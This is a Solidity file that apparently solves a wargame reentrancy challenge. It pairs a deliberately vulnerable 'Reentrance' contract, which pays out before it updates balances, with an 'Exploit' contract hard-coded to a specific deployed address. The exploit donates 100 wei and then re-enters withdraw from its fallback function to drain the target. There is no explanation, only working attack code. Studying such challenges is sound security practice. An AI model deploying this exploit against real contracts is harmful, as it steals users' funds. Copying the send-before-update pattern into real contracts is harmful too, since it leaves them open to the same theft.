// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

contract Reentrance {

  mapping(address => uint) public balances;

  constructor () payable {}

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      require(result, "Failed to send eth");
      unchecked {
        balances[msg.sender] -= _amount;
      }
    }
  }
}

contract Exploit {
    Reentrance public _r = Reentrance(0xAB8E5130Ce415ce5d679D299170dbAc64CaBaE13);


    function exploit() public payable {
        _r.donate{value: 100 wei}(address(this));
        _r.withdraw(100 wei);
    }

    fallback() external payable {
        if (address(_r).balance >= 100 wei) {
            _r.withdraw(100 wei);
        }
    }
}
